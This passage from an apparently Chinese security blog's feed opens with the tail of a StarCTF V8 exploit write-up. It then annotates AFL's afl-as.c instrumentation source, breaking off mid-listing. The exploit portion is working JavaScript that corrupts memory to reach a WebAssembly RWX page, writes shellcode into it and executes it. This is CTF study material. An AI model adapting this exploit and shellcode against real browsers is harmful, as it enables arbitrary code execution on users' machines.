class="hljs-subst">$&#123;tt&#125;</span>`</span>);</span><br><span class="line"><span class="hljs-comment">//%DebugPrint(ab);</span></span><br><span class="line"><span class="hljs-comment">//view(victim, 100);</span></span><br><span class="line"><span class="hljs-keyword">let</span> wasm_obj_lo = d2u(victim[wasm_idx])[<span class="hljs-number">0</span>];</span><br><span class="line"><span class="hljs-keyword">let</span> wasm_obj_hi = d2u(victim[wasm_idx])[<span class="hljs-number">1</span>];</span><br><span class="line">%DebugPrint(f)</span><br><span class="line"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">"[-] wasm object : "</span> + hex(wasm_obj_lo, wasm_obj_hi));</span><br><span class="line"></span><br><span class="line">tt = u2d(wasm_obj_lo - <span class="hljs-number">1</span>, wasm_obj_hi);</span><br><span class="line"><span class="hljs-built_in">eval</span>(<span class="hljs-string">`victim[<span class="hljs-subst">$&#123;idx + <span class="hljs-number">1</span>&#125;</span>] = <span class="hljs-subst">$&#123;tt&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> dv = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DataView</span>(ab);</span><br><span class="line"><span class="hljs-comment">// gdb</span></span><br><span class="line">SHARED_FUNCTION_INFO_TYPE_lo = dv.getUint32(<span class="hljs-number">0x18</span>, <span class="hljs-literal">true</span>);</span><br><span class="line">SHARED_FUNCTION_INFO_TYPE_hi = dv.getUint32(<span class="hljs-number">0x18</span> + <span class="hljs-number">4</span>, <span class="hljs-literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// SHARED_FUNCTION_INFO_TYPE_lo = dv.getUint32(0x10, true);</span></span><br><span class="line"><span class="hljs-comment">// SHARED_FUNCTION_INFO_TYPE_hi = dv.getUint32(0x10 + 4, true);</span></span><br><span class="line"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">"[-] SHARED_FUNCTION_INFO_TYPE : "</span> + Hex(SHARED_FUNCTION_INFO_TYPE_lo, SHARED_FUNCTION_INFO_TYPE_hi));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tt = u2d(SHARED_FUNCTION_INFO_TYPE_lo - <span class="hljs-number">1</span>, SHARED_FUNCTION_INFO_TYPE_hi);</span><br><span class="line"><span class="hljs-built_in">eval</span>(<span class="hljs-string">`victim[<span class="hljs-subst">$&#123;idx + <span class="hljs-number">1</span>&#125;</span>] = <span class="hljs-subst">$&#123;tt&#125;</span>`</span>);</span><br><span class="line">WASM_EXPORTED_FUNCTION_DATA_TYP_lo = dv.getUint32(<span class="hljs-number">0x8</span>, <span class="hljs-literal">true</span>);</span><br><span class="line">WASM_EXPORTED_FUNCTION_DATA_TYP_hi = dv.getUint32(<span class="hljs-number">0x8</span>+<span class="hljs-number">4</span>, <span class="hljs-literal">true</span>);</span><br><span class="line"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">"[-] WASM_EXPORTED_FUNCTION_DATA_TYPE : "</span> + Hex(WASM_EXPORTED_FUNCTION_DATA_TYP_lo, WASM_EXPORTED_FUNCTION_DATA_TYP_hi));</span><br><span class="line"></span><br><span class="line">tt = u2d(WASM_EXPORTED_FUNCTION_DATA_TYP_lo - <span class="hljs-number">1</span>, WASM_EXPORTED_FUNCTION_DATA_TYP_hi);</span><br><span class="line"><span class="hljs-built_in">eval</span>(<span class="hljs-string">`victim[<span class="hljs-subst">$&#123;idx + <span class="hljs-number">1</span>&#125;</span>] = <span class="hljs-subst">$&#123;tt&#125;</span>`</span>);</span><br><span class="line">WASM_INSTANCE_TYPE_lo = dv.getUint32(<span class="hljs-number">0x10</span>, <span class="hljs-literal">true</span>);</span><br><span class="line">WASM_INSTANCE_TYPE_hi = dv.getUint32(<span class="hljs-number">0x10</span>+<span class="hljs-number">4</span>, <span class="hljs-literal">true</span>);</span><br><span class="line"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">"[-] WASM_INSTANCE_TYPE : "</span> + Hex(WASM_INSTANCE_TYPE_lo, WASM_INSTANCE_TYPE_hi));</span><br><span class="line"></span><br><span class="line">tt = u2d(WASM_INSTANCE_TYPE_lo - <span class="hljs-number">1</span>, WASM_INSTANCE_TYPE_hi);</span><br><span class="line"><span class="hljs-built_in">eval</span>(<span class="hljs-string">`victim[<span class="hljs-subst">$&#123;idx + <span class="hljs-number">1</span>&#125;</span>] = <span class="hljs-subst">$&#123;tt&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// use gdb_debug to gain the specifi coffset</span></span><br><span class="line">rwx_lo = dv.getUint32(<span class="hljs-number">0x88</span>, <span class="hljs-literal">true</span>);</span><br><span class="line">rwx_hi = dv.getUint32(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>, <span class="hljs-literal">true</span>);</span><br><span class="line"><span class="hljs-comment">// rwx_lo = dv.getUint32(0xd0, true);</span></span><br><span class="line"><span class="hljs-comment">// rwx_hi = dv.getUint32(0xd0+4, true);</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">"[-] rwx page : "</span> + Hex(rwx_lo, rwx_hi));</span><br><span class="line"><span class="hljs-comment">//%SystemBreak()</span></span><br><span class="line">tt = u2d(rwx_lo, rwx_hi);</span><br><span class="line"><span class="hljs-built_in">eval</span>(<span class="hljs-string">`victim[<span class="hljs-subst">$&#123;idx + <span class="hljs-number">1</span>&#125;</span>] = <span class="hljs-subst">$&#123;tt&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> shellcode = [<span class="hljs-number">0xbb48c031</span>, <span class="hljs-number">0x91969dd1</span>, <span class="hljs-number">0xff978cd0</span>, <span class="hljs-number">0x53dbf748</span>, <span class="hljs-number">0x52995f54</span>, <span class="hljs-number">0xb05e5457</span>, <span class="hljs-number">0x50f3b</span>];</span><br><span class="line"><span class="hljs-comment">//var shellcode = [0x48c93148, 0xfff3e981, 0x8d48ffff, 0xffffef05, 0x23bb48ff, 0x47e51aa4, 0x4877a006, 0x48275831, 0xfffff82d, 0x49f4e2ff, 0xf7c429f, 0x4a158fbd, 0x2f9635ca, 0xaa3ff306, 0x24c87243, 0xaa3fa006, 0x7a0d4842, 0x4d77a006, 0x7ed63ac7, 0x15479128, 0x75cb2b8a, 0x12579536, 0x67d12996, 0x4158807a, 0x24ca74cd, 0x4557d467, 0x67827bc8, 0x4019807a, 0x69dc2984, 0xd419037, 0x77d73495, 0x10458033, 0x47d62997, 0xaa3ff750, 0x47e01542, 0x77a006];</span></span><br><span class="line"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">dv.setUint32(i * <span class="hljs-number">4</span>, shellcode[i], <span class="hljs-literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">f(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">exploit()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Intro-一道-StarCTF-上的-V8-引擎-Writeup&quot;&gt;&lt;a href=&quot;#Intro-一道-StarCTF-上的-V8-引擎-Writeup&quot; class=&quot;headerlink&quot; title=&quot;Intro: 一道 StarCTF 上的 V8 引擎 Writeup&quot;&gt;&lt;/a&gt;Intro: 一道 StarCTF 上的 V8 引擎 Writeup&lt;/h2&gt;
    
    </summary>
    
      <category term="Browser Explore" scheme="http://p1umer.gituhb.io/categories/Browser-Explore/"/>
    
      <category term="V8" scheme="http://p1umer.gituhb.io/categories/Browser-Explore/V8/"/>
    
      <category term="Exploit" scheme="http://p1umer.gituhb.io/categories/Browser-Explore/V8/Exploit/"/>
    
    
      <category term="Browser Explore" scheme="http://p1umer.gituhb.io/tags/Browser-Explore/"/>
    
      <category term="V8" scheme="http://p1umer.gituhb.io/tags/V8/"/>
    
      <category term="Exploit" scheme="http://p1umer.gituhb.io/tags/Exploit/"/>
    
  </entry>
  
  <entry>
    <title>AFL 初探（一）</title>
    <link href="http://p1umer.gituhb.io/2019/03/20/AFL-%E5%88%9D%E6%8E%A2/"/>
    <id>http://p1umer.gituhb.io/2019/03/20/AFL-初探/</id>
    <published>2019-03-19T17:39:12.000Z</published>
    <updated>2019-07-04T15:41:50.230Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="intro-basic-analysis-of-afl">Intro: Basic Analysis of AFL</span></h2> <a id="more"></a><h2><span id="afl-初探">AFL 初探</span></h2><p><img src="https://barro.github.io/2018/06/afl-fuzz-on-different-file-systems/afl-forkserver-visualization-2900.png" alt="image"></p><h3><span id="源码分析">源码分析</span></h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line">static void add_instrumentation(void) &#123;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">  static u8 line[MAX_LINE];</span><br><span class="line"></span><br><span class="line">  FILE* inf;</span><br><span class="line">  FILE* outf;</span><br><span class="line">  s32 outfd;</span><br><span class="line">  u32 ins_lines = 0;</span><br><span class="line"></span><br><span class="line">  u8  instr_ok = 0, skip_csect = 0, skip_next_label = 0,</span><br><span class="line">      skip_intel = 0, skip_app = 0, instrument_next = 0;</span><br><span class="line"></span><br><span class="line">#ifdef __APPLE__</span><br><span class="line"></span><br><span class="line">  u8* colon_pos;</span><br><span class="line"></span><br><span class="line">#endif /* __APPLE__ */</span><br><span class="line"></span><br><span class="line">//输入文件，gcc生成</span><br><span class="line">  if (input_file) &#123;</span><br><span class="line"></span><br><span class="line">    inf = fopen(input_file, &quot;r&quot;);</span><br><span class="line">    if (!inf) PFATAL(&quot;Unable to read &apos;%s&apos;&quot;, input_file);</span><br><span class="line"></span><br><span class="line">  &#125; else inf = stdin;</span><br><span class="line"></span><br><span class="line">//输出文件</span><br><span class="line">  outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, 0600);</span><br><span class="line"></span><br><span class="line">  if (outfd &lt; 0) PFATAL(&quot;Unable to write to &apos;%s&apos;&quot;, modified_file);</span><br><span class="line"></span><br><span class="line">  outf = fdopen(outfd, &quot;w&quot;);</span><br><span class="line"></span><br><span class="line">  if (!outf) PFATAL(&quot;fdopen() failed&quot;);  </span><br><span class="line"></span><br><span class="line">//对于inf进行每行的遍历插桩</span><br><span class="line">  while (fgets(line, MAX_LINE, inf)) &#123;</span><br><span class="line"></span><br><span class="line">    /* In some cases, we want to defer writing the instrumentation trampoline</span><br><span class="line">       until after all the labels, macros, comments, etc. If we&apos;re in this</span><br><span class="line">       mode, and if the line starts with a tab followed by a character, dump</span><br><span class="line">       the trampoline now. */</span><br><span class="line"></span><br><span class="line">//满足这些条件就插桩,条件由下面的扫描提供</span><br><span class="line">    if (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class="line">        instrument_next &amp;&amp; line[0] == &apos;\t&apos; &amp;&amp; isalpha(line[1])) &#123;</span><br><span class="line"></span><br><span class="line">      fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">              R(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">      instrument_next = 0;</span><br><span class="line">      ins_lines++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* Output the actual line, call it a day in pass-thru mode. */</span><br><span class="line">//把原始的代码写入outf</span><br><span class="line">    fputs(line, outf);</span><br><span class="line"></span><br><span class="line">    if (pass_thru) continue;</span><br><span class="line"></span><br><span class="line">    /* All right, this is where the actual fun begins. For one, we only want to</span><br><span class="line">       instrument the .text section. So, let&apos;s keep track of that in processed</span><br><span class="line">       files - and let&apos;s set instr_ok accordingly. */</span><br><span class="line"></span><br><span class="line">//判断代码段，只插桩.text段</span><br><span class="line">    if (line[0] == &apos;\t&apos; &amp;&amp; line[1] == &apos;.&apos;) &#123;</span><br><span class="line"></span><br><span class="line">      /* OpenBSD puts jump tables directly inline with the code, which is</span><br><span class="line">         a bit annoying. They use a specific format of p2align directives</span><br><span class="line">         around them, so we use that as a signal. */</span><br><span class="line"></span><br><span class="line">      if (!clang_mode &amp;&amp; instr_ok &amp;&amp; !strncmp(line + 2, &quot;p2align &quot;, 8) &amp;&amp;</span><br><span class="line">          isdigit(line[10]) &amp;&amp; line[11] == &apos;\n&apos;) skip_next_label = 1;</span><br><span class="line"></span><br><span class="line">      if (!strncmp(line + 2, &quot;text\n&quot;, 5) ||</span><br><span class="line">          !strncmp(line + 2, &quot;section\t.text&quot;, 13) ||</span><br><span class="line">          !strncmp(line + 2, &quot;section\t__TEXT,__text&quot;, 21) ||</span><br><span class="line">          !strncmp(line + 2, &quot;section __TEXT,__text&quot;, 21)) &#123;</span><br><span class="line">        instr_ok = 1;</span><br><span class="line">        continue; </span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if (!strncmp(line + 2, &quot;section\t&quot;, 8) ||</span><br><span class="line">          !strncmp(line + 2, &quot;section &quot;, 8) ||</span><br><span class="line">          !strncmp(line + 2, &quot;bss\n&quot;, 4) ||</span><br><span class="line">          !strncmp(line + 2, &quot;data\n&quot;, 5)) &#123;</span><br><span class="line">        instr_ok = 0;</span><br><span class="line">        continue;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* Detect off-flavor assembly (rare, happens in gdb). When this is</span><br><span class="line">       encountered, we set skip_csect until the opposite directive is</span><br><span class="line">       seen, and we do not instrument. */</span><br><span class="line"></span><br><span class="line">//判断位数</span><br><span class="line">    if (strstr(line, &quot;.code&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">      if (strstr(line, &quot;.code32&quot;)) skip_csect = use_64bit;</span><br><span class="line">      if (strstr(line, &quot;.code64&quot;)) skip_csect = !use_64bit;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* Detect syntax changes, as could happen with hand-written assembly.</span><br><span class="line">       Skip Intel blocks, resume instrumentation when back to AT&amp;T. */</span><br><span class="line"></span><br><span class="line">    if (strstr(line, &quot;.intel_syntax&quot;)) skip_intel = 1;</span><br><span class="line">    if (strstr(line, &quot;.att_syntax&quot;)) skip_intel = 0;</span><br><span class="line"></span><br><span class="line">    /* Detect and skip ad-hoc __asm__ blocks, likewise skipping them. */</span><br><span class="line"></span><br><span class="line">    if (line[0] == &apos;#&apos; || line[1] == &apos;#&apos;) &#123;</span><br><span class="line"></span><br><span class="line">      if (strstr(line, &quot;#APP&quot;)) skip_app = 1;</span><br><span class="line">      if (strstr(line, &quot;#NO_APP&quot;)) skip_app = 0;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* If we&apos;re in the right mood for instrumenting, check for function</span><br><span class="line">       names or conditional labels. This is a bit messy, but in essence,</span><br><span class="line">       we want to catch:</span><br><span class="line"></span><br><span class="line">         ^main:      - function entry point (always instrumented)</span><br><span class="line">         ^.L0:       - GCC branch label</span><br><span class="line">         ^.LBB0_0:   - clang branch label (but only in clang mode)</span><br><span class="line">         ^\tjnz foo  - conditional branches</span><br><span class="line"></span><br><span class="line">       ...but not:</span><br><span class="line"></span><br><span class="line">         ^# BB#0:    - clang comments</span><br><span class="line">         ^ # BB#0:   - ditto</span><br><span class="line">         ^.Ltmp0:    - clang non-branch labels</span><br><span class="line">         ^.LC0       - GCC non-branch labels</span><br><span class="line">         ^.LBB0_0:   - ditto (when in GCC mode)</span><br><span class="line">         ^\tjmp foo  - non-conditional jumps</span><br><span class="line"></span><br><span class="line">       Additionally, clang and GCC on MacOS X follow a different convention</span><br><span class="line">       with no leading dots on labels, hence the weird maze of #ifdefs</span><br><span class="line">       later on.</span><br><span class="line"></span><br><span class="line">     */</span><br><span class="line"></span><br><span class="line">    if (skip_intel || skip_app || skip_csect || !instr_ok ||</span><br><span class="line">        line[0] == &apos;#&apos; || line[0] == &apos; &apos;) continue;</span><br><span class="line"></span><br><span class="line">    /* Conditional branch instruction (jnz, etc). We append the instrumentation</span><br><span class="line">       right after the branch (to instrument the not-taken path) and at the</span><br><span class="line">       branch destination label (handled later on). */</span><br><span class="line"></span><br><span class="line">//碰到jcc进行无条件插桩</span><br><span class="line">    if (line[0] == &apos;\t&apos;) &#123;</span><br><span class="line"></span><br><span class="line">      if (line[1] == &apos;j&apos; &amp;&amp; line[2] != &apos;m&apos; &amp;&amp; R(100) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line">        fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">                R(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">        ins_lines++;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      continue;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">//label中均包含&quot;:&quot;,下面的工作就是匹配各种label</span><br><span class="line">    /* Label of some sort. This may be a branch destination, but we need to</span><br><span class="line">       tread carefully and account for several different formatting</span><br><span class="line">       conventions. */</span><br><span class="line"></span><br><span class="line">#ifdef __APPLE__</span><br><span class="line"></span><br><span class="line">    /* Apple: L&lt;whatever&gt;&lt;digit&gt;: */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if ((colon_pos = strstr(line, &quot;:&quot;))) &#123;</span><br><span class="line"></span><br><span class="line">      if (line[0] == &apos;L&apos; &amp;&amp; isdigit(*(colon_pos - 1))) &#123;</span><br><span class="line"></span><br><span class="line">#else</span><br><span class="line"></span><br><span class="line">    /* Everybody else: .L&lt;whatever&gt;: */</span><br><span class="line"></span><br><span class="line">//匹配[.L&lt;wtever&gt;:]</span><br><span class="line">    if (strstr(line, &quot;:&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">      if (line[0] == &apos;.&apos;) &#123;</span><br><span class="line"></span><br><span class="line">#endif /* __APPLE__ */</span><br><span class="line"></span><br><span class="line">        /* .L0: or LBB0_0: style jump destination */</span><br><span class="line"></span><br><span class="line">#ifdef __APPLE__</span><br><span class="line"></span><br><span class="line">        /* Apple: L&lt;num&gt; / LBB&lt;num&gt; */</span><br><span class="line"></span><br><span class="line">        if ((isdigit(line[1]) || (clang_mode &amp;&amp; !strncmp(line, &quot;LBB&quot;, 3)))</span><br><span class="line">            &amp;&amp; R(100) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line">#else</span><br><span class="line"></span><br><span class="line">        /* Apple: .L&lt;num&gt; / .LBB&lt;num&gt; */</span><br><span class="line"></span><br><span class="line">        if ((isdigit(line[2]) || (clang_mode &amp;&amp; !strncmp(line + 1, &quot;LBB&quot;, 3)))</span><br><span class="line">            &amp;&amp; R(100) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line">#endif /* __APPLE__ */</span><br><span class="line"></span><br><span class="line">          /* An optimization is possible here by adding the code only if the</span><br><span class="line">             label is mentioned in the code in contexts other than call / jmp.</span><br><span class="line">             That said, this complicates the code by requiring two-pass</span><br><span class="line">             processing (messy with stdin), and results in a speed gain</span><br><span class="line">             typically under 10%, because compilers are generally pretty good</span><br><span class="line">             about not generating spurious intra-function jumps.</span><br><span class="line"></span><br><span class="line">             We use deferred output chiefly to avoid disrupting</span><br><span class="line">             .Lfunc_begin0-style exception handling calculations (a problem on</span><br><span class="line">             MacOS X). */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">          if (!skip_next_label) instrument_next = 1; else skip_next_label = 0;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        /* Function label (always instrumented, deferred mode). */</span><br><span class="line">//匹配到一个label，instrument_next=1</span><br><span class="line">        instrument_next = 1;</span><br><span class="line">    </span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">//最后插入一个 main_payload</span><br><span class="line">  if (ins_lines)</span><br><span class="line">    fputs(use_64bit ? main_payload_64 : main_payload_32, outf);</span><br><span class="line"></span><br><span class="line">  if (input_file) fclose(inf);</span><br><span class="line">  fclose(outf);</span><br><span class="line"></span><br><span class="line">  if (!be_quiet) &#123;</span><br><span class="line"></span><br><span class="line">    if (!ins_lines) WARNF(&quot;No instrumentation targets found%s.&quot;,</span><br><span class="line">                          pass_thru ? &quot; (pass-thru mode)&quot; : &quot;&quot;);</span><br><span class="line">    else OKF(&quot;Instrumented %u locations (%s-bit, %s mode, ratio %u%%).&quot;,</span><br><span class="line">             ins_lines, use_64bit ? &quot;64&quot; : &quot;32&quot;,</span><br><span class="line">             getenv(&quot;AFL_HARDEN&quot;) ? &quot;hardened&quot; : </span><br><span class="line">             (sanitizer ? &quot;ASAN/MSAN&quot; : &quot;non-hardened&quot;),</span><br><span class="line">             inst_ratio);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>afl-as.c文件中插桩的条件：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/* In some cases, we want to defer writing the instrumentation trampoline</span><br><span class="line">   until after all the labels, macros, comments, etc. If we&apos;re in this</span><br><span class="line">   mode, and if the line starts with a tab followed by a character, dump</span><br><span class="line">   the trampoline now. */</span><br><span class="line">if (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class="line">    instrument_next &amp;&amp; line[0] == &apos;\t&apos; &amp;&amp; isalpha(line[1])) &#123;</span><br><span class="line"></span><br><span class="line">  fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">          R(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">  instrument_next = 0;</span><br><span class="line">  ins_lines++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体看一下插进去的代码是什么：</p><p>通过fprintf()将格式化字符串添加到汇编文件的相应位置，只分析32位的情况，trampoline_fmt_32的具体内容如下：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">static const u8* trampoline_fmt_32 =</span><br><span class="line"></span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;.align 4\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;leal -16(%%esp), %%esp\n&quot;</span><br><span class="line">  &quot;movl %%edi,  0(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%edx,  4(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%ecx,  8(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%eax, 12(%%esp)\n&quot;</span><br><span class="line">  &quot;movl $0x%08x, %%ecx\n&quot;</span><br><span class="line">  &quot;call __afl_maybe_log\n&quot;</span><br><span class="line">  &quot;movl 12(%%esp), %%eax\n&quot;</span><br><span class="line">  &quot;movl  8(%%esp), %%ecx\n&quot;</span><br><span 